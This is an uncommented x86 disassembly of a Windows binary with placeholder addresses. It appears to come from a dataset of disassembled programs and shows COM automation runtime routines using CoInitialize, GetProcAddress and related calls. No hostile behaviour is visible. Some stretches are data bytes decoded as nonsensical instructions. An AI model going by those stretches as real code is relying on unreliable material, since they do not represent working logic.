mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4049a4
xor eax eax
push ebp
push sub_46138c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402cfc
mov eax ebx
call sub_404874
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_405928
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_404884
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_4042c0
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_4042a8
mov eax [ ebp - 0x48 ]
pop edx
call sub_408064
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_4611a0
mov eax [ ebp - 0x8 ]
call sub_4611a0
mov eax edi
mov edx [ ebp - 0xc ]
call sub_405940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461393
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404a74
retn
mov ebx 0x15
jmp r-xdata
sub_4613ac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_461438
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_405928
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_414a84
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46143f
lea eax [ ebp - 0xc ]
call sub_405928
lea eax [ ebp - 0x8 ]
call sub_405928
retn
lea eax [ ebp - 0xc ]
call sub_405928
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_414a84
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_461458
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4614ea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4614f1
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_405928
retn
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_414a84
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405928
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_414a84
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_414a84
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_461508
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46160a
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4616fc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_4042c0
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4610ec
jmp sub_403a74
lea eax [ ebp - 0x8 ]
call sub_404718
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_404718
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_404718
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_4616cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461703
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40405c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404730
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_46170c
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_4049a4
xor eax eax
push ebp
push sub_461a3f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_461a1c
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_461cec
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404e34
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404e34
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461a23
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404e10
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404e34
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40f3ac
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_461a50
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
pop ecx
pop ecx
pop ebp
retn
sub_461a84
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_408824
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_4611a0
push ebp
call sub_461a50
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_461b7c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_461b64
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_461a84
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46170c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40edb8
sub_461c18
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_461cdd
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46101c
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_4042c0
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_4042c0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_4042c0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4610ec
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ce4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40405c
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_403a74
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404bac
jmp r-xdata
sub_461d08
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_461cf8
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_461c18
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_461dec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_461d08
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_461e1d ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40edb8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_461ec8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_414a84
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_414a84
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_461f40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_461fb6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461fbd
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404ac0
call CoUninitialize
sub_461fc0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_461508
mov eax sub_461b7c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_461dec
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_461ec8
sub_462018
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46203d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462044
retn
sub_462050
pushfd
and [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
and [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov [ ecx ] ah
inc esi
je r-xdata
popfd
and [ esi ] eax
movsd [ edi ] [ esi ]
and [ esi ] eax
xlat
and [ esi ] eax
loope r-xdata
jb r-xdata
add [ eax ] al
insd
inc ecx
popad
jo r-xdata
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
inc esi
add bl ch
and [ esi ] eax

inc [ ebx - 0x23fbdbbc ]
jmp sub_4059fc
outsd
je r-xdata
add [ edx ] bl
and [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx ] ah
inc esi
add [ eax + eax ] dl
add [ eax ] al
inc esp
adc al [ eax ]
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] dl
push esp
inc ecx
popad
jo r-xdata
jb r-xdata
add al 0x24
retn
popad
jo r-xdata
add cl al
and [ esi ] eax
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0x1c004620
add [ eax ] al
add [ edx + edx + 0x40 ] al
add [ eax ] dh
xor eax 0x59a80040
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x26fc0040 ] bl
inc esi
add [ eax ] ch
daa
inc esi
add [ ebx + ebp ] ah
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0xc0040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] eax
adc al 0x0
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
add [ eax + 0x46 ] ah
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
add bh dh
and al [ esi ]
add [ ebx ] esp
inc esi
add [ ebx ] cl
and eax [ esi ]
jmp r-xdata
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462d4d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_46284f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x232cda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ebx ]
inc esi
add [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and eax [ esi ]
sub [ eax ] al
add [ eax ] al
push eax
and [ esi ] al
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x26fc0040 ] bl
inc esi
add [ eax ] ch
daa
inc esi
add [ eax ] ch
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
cmp eax 0x220bda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
movsb [ edi ] [ esi ]
and al [ esi ]
sbb esp [ edx ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x280046 ] ch
add [ eax ] al
push eax
and [ esi ] al
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x26fc0040 ] bl
inc esi
add [ edx + ebp + 0x46 ] bh
add [ eax + ebp + 0x540c0046 ] dh
inc esi
outsd
outsb
je r-xdata
scasd [ edi ]
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_40596c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462d54
lea eax [ ebp - 0x2c ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_404718
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_42067c
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_404864
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404874
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_4206f0
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x1
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc esi
add [ eax ] bh
xor eax [ esi ]
pop eax
xor eax [ esi ]
movsb [ edi ] [ esi ]
sub al 0x42
